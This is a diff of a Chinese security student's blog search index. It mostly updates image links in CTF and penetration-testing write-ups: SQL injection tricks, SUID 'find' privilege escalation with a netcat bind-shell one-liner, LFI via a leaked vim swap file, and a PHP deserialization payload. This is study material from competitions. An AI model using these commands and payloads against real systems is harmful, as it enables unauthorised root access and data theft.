@@ -9,20 +9,20 @@
 <li><p>关键的查询代码是 <code>select $post[&#39;query&#39;]||flag from Flag</code></p>
 </li>
 <li><p>这里要想办法使得||变为字符串连接操作符，来拼接sql命令</p>
-<p><a href="http://39.96.76.44:8080/image/1wW" target="_blank" rel="noopener"><img src="http://39.96.76.44:8080/images/2020/10/27/3a4a788689cc9bffc5b81866a19b218a.png" srcset="/img/loading.gif" alt="3a4a788689cc9bffc5b81866a19b218a.png"></a></p>
+<p><a href="https://www.sipcoj.com/image/Ip6" target="_blank" rel="noopener"><img src="https://www.sipcoj.com/images/2020/10/28/image-20201027103732671.png" srcset="/img/loading.gif" alt="image-20201027103732671.png"></a></p>
 </li>
 </ul>
 <h5 id="PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。"><a href="#PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。" class="headerlink" title="PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。"></a><strong><code>PIPES_AS_CONCAT</code></strong> 将 <code>||</code> 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</h5><p>本地测试一下：</p>
 <p>1.sql_mode不为PIPES_AS_CONCAT</p>
-<p><a href="http://39.96.76.44:8080/image/9YD" target="_blank" rel="noopener"><img src="http://39.96.76.44:8080/images/2020/10/27/e9593f98776a36c36217fef096c89d9f.png" srcset="/img/loading.gif" alt="e9593f98776a36c36217fef096c89d9f.png"></a></p>
+<p><a href="https://www.sipcoj.com/image/Szp" target="_blank" rel="noopener"><img src="https://www.sipcoj.com/images/2020/10/28/image-20201027103752915.png" srcset="/img/loading.gif" alt="image-20201027103752915.png"></a></p>
 <p>1.sql_mode为PIPES_AS_CONCAT</p>
-<p><img src="http://39.96.76.44:8080/images/2020/10/27/f5c5eabd5ee52ed79685b26f5fd01c43.png" srcset="/img/loading.gif" alt="f5c5eabd5ee52ed79685b26f5fd01c43.png"></p>
+<p><a href="https://www.sipcoj.com/image/fOb" target="_blank" rel="noopener"><img src="https://www.sipcoj.com/images/2020/10/28/image-20201027103908419.png" srcset="/img/loading.gif" alt="image-20201027103908419.png"></a></p>
 <ul>
 <li>关于非预期解 : <code>*,1</code></li>
 <li>拼接一下，不难理解 : <code>select *,1||flag from Flag</code></li>
 <li>等同于 <code>select *,1 from Flag</code></li>
 </ul>
-<p><img src="http://39.96.76.44:8080/images/2020/10/27/42e9dfad5d55803fbd0c3c603f3c1db3.png" srcset="/img/loading.gif" alt="42e9dfad5d55803fbd0c3c603f3c1db3.png"></p>
+<p><img src="https://www.sipcoj.com/images/2020/10/28/image-20201027103952485.png" srcset="/img/loading.gif" alt="image-20201027103952485.png"></p>
 ]]></content>
   </entry>
   <entry>
@@ -45,29 +45,14 @@ find / -user root -perm -4000 -print 2&gt;/dev/null
 
 find / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><pre><code>ls -al /usr/bin/find
 -rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>定位到tmp目录下，touch（创建）一个aaa文件</p>
-<p><img src="https://i.loli.net/2020/09/04/nLjxSZXcP6m75Yp.jpg" srcset="/img/loading.gif" alt=""></p>
-<pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p><img src="https://i.loli.net/2020/09/04/uL9epAo2IHFSgNf.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="https://sipcoj.com/images/2020/11/15/QQ20200904165147.jpg" srcset="/img/loading.gif" alt="QQ20200904165147.jpg"></p>
+<pre><code>find aaa -exec &#39;/bin/sh&#39; \;</code></pre><p><img src="https://sipcoj.com/images/2020/11/15/QQ20200904165245.jpg" srcset="/img/loading.gif" alt="QQ20200904165245.jpg"></p>
 <p>大部分Linux 系统都安装了nc。使用</p>
 <p><code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code></p>
 <p> 即可成功反弹root shell</p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>new page</title>
-    <url>/binary/new-page/</url>
-    <content><![CDATA[<h4 id="近况："><a href="#近况：" class="headerlink" title="近况："></a>近况：</h4><p>博客搭建好久了，但一直都没有好好整理过文章</p>
-<p>转专业考试结束了，应该可以顺利的进入信安专业学习</p>
-<p>今天换了hexo 的主题，感觉简单点看起来也更舒适一些吧</p>
-<p>以后要慢慢开始记录自己学习成长的经历了</p>
-<p>也感谢一直陪在我身边鼓励我的朋友们</p>
-<p>Fighting！！</p>
-<p><img src="https://i.loli.net/2020/08/10/f3DELUjY2drknKM.jpg" srcset="/img/loading.gif" alt=""></p>
-]]></content>
-      <categories>
-        <category>binary</category>
       </categories>
   </entry>
   <entry>
@@ -84,28 +69,30 @@ find / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a hre
     <url>/ctf/di-si-jie-lan-mao-bei-xian-shang-sai-bu-fen-wp/</url>
     <content><![CDATA[<h1 id="第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp"><a href="#第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp" class="headerlink" title="第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp"></a><strong>第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp</strong></h1><p>这次比赛应该可以顺利进入决赛，每次打比赛都是一次成长的经历吧，感觉到自己很多方面的不足，还要继续加油努力啊！</p>
 <h2 id="0x00-题目名称：签到"><a href="#0x00-题目名称：签到" class="headerlink" title="0x00 题目名称：签到"></a><strong>0x00</strong> 题目名称：签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p><strong>010editor</strong>打开，发现是gif</p>
-<p><img src="https://i.loli.net/2020/08/10/rx8ACPILkJFhUXg.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><a href="http://sipcoj.com/image/0wH" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/rx8ACPILkJFhUXg.jpg" srcset="/img/loading.gif" alt="rx8ACPILkJFhUXg.jpg"></a></p>
 <p>想到gif多帧，分离gif 网址：<a href="https://zh.bloggif.com/gif-extract" target="_blank" rel="noopener">https://zh.bloggif.com/gif-extract</a></p>
 <p>得到两张gif</p>
-<p><img src="https://i.loli.net/2020/08/10/kQdhX4ytPaxSFir.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><a href="http://sipcoj.com/image/rwu" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/kQdhX4ytPaxSFir.jpg" srcset="/img/loading.gif" alt="kQdhX4ytPaxSFir.jpg"></a></p>
 <p><strong>分别使用</strong>Stegsolve打开，合并flag</p>
-<p><img src="https://i.loli.net/2020/08/10/ljQAkEBCoeVJSUY.jpg" srcset="/img/loading.gif" alt="">)<img src="https://i.loli.net/2020/08/10/lTfmXJtHFSME9Zw.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><a href="http://sipcoj.com/image/5BL" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/ljQAkEBCoeVJSUY.jpg" srcset="/img/loading.gif" alt="ljQAkEBCoeVJSUY.jpg"></a></p>
+<p><a href="http://sipcoj.com/image/8Xa" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/lTfmXJtHFSME9Zw.jpg" srcset="/img/loading.gif" alt="lTfmXJtHFSME9Zw.jpg"></a></p>
+<hr>
 <h3 id="FLAG值："><a href="#FLAG值：" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{we1c0m3}</strong></p>
 <h2 id="0x01题目名称：zuc"><a href="#0x01题目名称：zuc" class="headerlink" title="0x01题目名称：zuc"></a><strong>0x01</strong>题目名称：zuc</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p><strong>经过搜索引擎查询，zuc是祖冲之算法，找到工具GmSSL</strong></p>
 <p><a href="https://github.com/guanzhi/GmSSL" target="_blank" rel="noopener"><strong>https://github.com/guanzhi/GmSSL</strong></a></p>
 <p><strong>命令：gmssl zuc -d -in flag.zuc</strong></p>
 <p><strong>输入key：chunqiugame</strong></p>
-<p><img src="https://i.loli.net/2020/08/10/4XlYbSTaHvfnOjx.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><a href="http://sipcoj.com/image/QQc" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/4XlYbSTaHvfnOjx.jpg" srcset="/img/loading.gif" alt="4XlYbSTaHvfnOjx.jpg"></a></p>
 <h3 id="FLAG值：-1"><a href="#FLAG值：-1" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{228cca62-fddc-44ac-8173-c99be4c40a41}</strong></p>
 <h2 id="0x02-题目名称：Inclusion"><a href="#0x02-题目名称：Inclusion" class="headerlink" title="0x02 题目名称：Inclusion"></a>0x02 题目名称：Inclusion</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>根据提示猜想可能是vim文件泄露</p>
 <p><a href="http://eci-2ze471n7exckwg5q0jpq.cloudeci1.ichunqiu.com/.index.php.swp" target="_blank" rel="noopener"><strong>http://eci-2ze471n7exckwg5q0jpq.cloudeci1.ichunqiu.com/.index.php.swp</strong></a></p>
 <p><strong>下载源码，打开：vim –r index.php.swp</strong></p>
-<p><img src="https://i.loli.net/2020/08/10/uiaobY7jEtTvDQM.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/uiaobY7jEtTvDQM.jpg" srcset="/img/loading.gif" alt="uiaobY7jEtTvDQM.jpg"></p>
 <p><strong>审计后，使用burp抓包，在http请求头中插入php代码,然后包含res文件进行命令执行,拿到flag</strong></p>
-<p><img src="https://i.loli.net/2020/08/10/xEwFHXbaKC5OkeI.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/xEwFHXbaKC5OkeI.jpg" srcset="/img/loading.gif" alt="xEwFHXbaKC5OkeI.jpg"></p>
 <h3 id="FLAG值：-2"><a href="#FLAG值：-2" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{964d75a2-f0af-4170-9a4a-0d104ceead9f}</strong></p>
 <h2 id="0x03-题目名称：sudo"><a href="#0x03-题目名称：sudo" class="headerlink" title="0x03 题目名称：sudo"></a><strong>0x03 题目名称：sudo</strong></h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><h5 id="nc-连接发现数独解密，使用python脚本"><a href="#nc-连接发现数独解密，使用python脚本" class="headerlink" title="nc 连接发现数独解密，使用python脚本"></a>nc 连接发现数独解密，使用python脚本</h5><p><strong>将数独复制1.txt中，使用python解密答案</strong></p>
-<p><img src="https://i.loli.net/2020/08/10/k6owUjdOBRympQi.jpg" srcset="/img/loading.gif" alt="">)<img src="https://i.loli.net/2020/08/10/TsKrNx8OlJ6bjDY.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/k6owUjdOBRympQi.jpg" srcset="/img/loading.gif" alt="k6owUjdOBRympQi.jpg">)<img src="https://i.loli.net/2020/08/10/TsKrNx8OlJ6bjDY.jpg" srcset="/img/loading.gif" alt=""></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time
 
 t0 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -222,12 +209,12 @@ t0 <span class="token operator">=</span> time<span class="token punctuation">.</
     p <span class="token operator">=</span> pointList<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
     tryInsert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span></code></pre>
 <p><strong>经过三次数独，输入token拿到flag</strong></p>
-<p><img src="https://i.loli.net/2020/08/10/KF62faRYbPjMJdW.jpg" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/KF62faRYbPjMJdW.jpg" srcset="/img/loading.gif" alt="KF62faRYbPjMJdW.jpg"></p>
 <h3 id="FLAG值：-3"><a href="#FLAG值：-3" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{42aaeae409e40a3f4bf245d9540ace98}</strong></p>
 <h2 id="0x04-题目名称：easiestSQLi"><a href="#0x04-题目名称：easiestSQLi" class="headerlink" title="0x04 题目名称：easiestSQLi"></a><strong>0x04 题目名称：easiestSQLi</strong></h2><h3 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>首先找注入点：<code>1||1 1^1</code></p>
-<p><img src="https://i.loli.net/2020/08/10/ApcMhavWr76U3zg.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/ApcMhavWr76U3zg.png" srcset="/img/loading.gif" alt="ApcMhavWr76U3zg.png"></p>
 <p>1^0返回YES：</p>
-<p><img src="https://i.loli.net/2020/08/10/mVQLyRPnW4HrDix.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/mVQLyRPnW4HrDix.png" srcset="/img/loading.gif" alt="mVQLyRPnW4HrDix.png"></p>
 <p>分析出来是整形注入</p>
 <p>根据:</p>
 <ul>
@@ -250,14 +237,14 @@ flag<span class="token operator">=</span><span class="token string">""</span>
       <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
       <span class="token keyword">break</span></code></pre>
 <p>运行后得到flag：</p>
-<p><img src="https://i.loli.net/2020/08/10/JBKwDU2vToCgzt1.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/JBKwDU2vToCgzt1.png" srcset="/img/loading.gif" alt="JBKwDU2vToCgzt1.png"></p>
 <h3 id="FLAG值：-4"><a href="#FLAG值：-4" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p>flag{365085b5-0fa3-4744-baec-690043267667}</p>
-<h2 id="0x05题目名称：Soitgoes"><a href="#0x05题目名称：Soitgoes" class="headerlink" title="0x05题目名称：Soitgoes"></a><strong>0x05题目名称：Soitgoes</strong></h2><h3 id="操作内容-1"><a href="#操作内容-1" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>首先查看网页源码：<img src="https://i.loli.net/2020/08/10/vPyUbEsCL1qgHnM.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="0x05题目名称：Soitgoes"><a href="#0x05题目名称：Soitgoes" class="headerlink" title="0x05题目名称：Soitgoes"></a><strong>0x05题目名称：Soitgoes</strong></h2><h3 id="操作内容-1"><a href="#操作内容-1" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>首先查看网页源码：<img src="http://sipcoj.com/images/2020/11/15/vPyUbEsCL1qgHnM.png" srcset="/img/loading.gif" alt="vPyUbEsCL1qgHnM.png"></p>
 <p>提示php://filter文件读取伪协议 获取try.php源码：</p>
 <p><code>?file=php://filter/read=convert.base64-encode/resource=try.php</code></p>
-<p><img src="https://i.loli.net/2020/08/10/OSosyhLb2PmktrV.png" srcset="/img/loading.gif" alt=""></p>
+<p>[<img src="http://sipcoj.com/images/2020/11/15/OSosyhLb2PmktrV.png" srcset="/img/loading.gif" alt="OSosyhLb2PmktrV.png"></p>
 <p>把得到的base64进行解码：</p>
-<p><img src="https://i.loli.net/2020/08/10/R6qsbxecyhrk3lK.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/R6qsbxecyhrk3lK.png" srcset="/img/loading.gif" alt="R6qsbxecyhrk3lK.png"></p>
 <p>try.php源码：</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name">Seri</span><span class="token punctuation">{</span>
@@ -339,7 +326,7 @@ if (isset($file)) {
 <p>而Get_Flag()函数在Seri类的__destruct()函数中执行，因此。</p>
 <p>$a =new Seri($b);</p>
 <p>但是这里</p>
-<p><img src="https://i.loli.net/2020/08/10/uDPxNXMmbvzATRe.png" srcset="/img/loading.gif" alt=""></p>
+<p><a href="http://sipcoj.com/image/7zC" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/uDPxNXMmbvzATRe.png" srcset="/img/loading.gif" alt="uDPxNXMmbvzATRe.png"></a></p>
 <p>需要绕过，开始想的是爆破随机数种子，后来想了想。只需要将$b-&gt;t1 = &amp;$b-&gt;t2,即t1指向t2指向的地址，当t2指向的地址的值改变了，t1的值也就变了.</p>
 <p>那么很简单的链条就出来了</p>
 <p>$b = new  Flag(‘flag.php’);</p>
@@ -390,16 +377,31 @@ if (isset($file)) {
 
 <span class="token delimiter">?></span></code></pre>
 <p>生成反序列化结果：</p>
-<p><img src="https://i.loli.net/2020/08/10/OTHXAe8tKI2BcLu.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="http://sipcoj.com/images/2020/11/15/OTHXAe8tKI2BcLu.png" srcset="/img/loading.gif" alt="OTHXAe8tKI2BcLu.png"></p>
 <pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Seri"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"alize"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token string">"fd00d3474e495e7b6d5f9f575b2d7ec4"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t2 "</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
 <p>payload:</p>
 <pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token keyword">try</span><span class="token punctuation">.</span>php<span class="token operator">&amp;</span>p<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Seri"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"alize"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token string">"fd00d3474e495e7b6d5f9f575b2d7ec4"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"t2 "</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
 <p>得到flag:</p>
-<p><img src="https://i.loli.net/2020/08/10/KeC36Nv9TFmuPOM.png" srcset="/img/loading.gif" alt=""></p>
+<p><a href="http://sipcoj.com/image/ETE" target="_blank" rel="noopener"><img src="http://sipcoj.com/images/2020/11/15/KeC36Nv9TFmuPOM.png" srcset="/img/loading.gif" alt="KeC36Nv9TFmuPOM.png"></a></p>
 <h3 id="FLAG值：-5"><a href="#FLAG值：-5" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p>flag{95718502-3c3d-493e-a069-8097b939b2da}</p>
 ]]></content>
       <categories>
         <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>new page</title>
+    <url>/binary/new-page/</url>
+    <content><![CDATA[<h4 id="近况："><a href="#近况：" class="headerlink" title="近况："></a>近况：</h4><p>博客搭建好久了，但一直都没有好好整理过文章</p>
+<p>转专业考试结束了，应该可以顺利的进入信安专业学习</p>
+<p>今天换了hexo 的主题，感觉简单点看起来也更舒适一些吧</p>
+<p>以后要慢慢开始记录自己学习成长的经历了</p>
+<p>也感谢一直陪在我身边鼓励我的朋友们</p>
+<p>Fighting！！</p>
+<p><img src="https://i.loli.net/2020/08/10/f3DELUjY2drknKM.jpg" srcset="/img/loading.gif" alt=""></p>
+]]></content>
+      <categories>
+        <category>binary</category>
       </categories>
   </entry>
 </search>
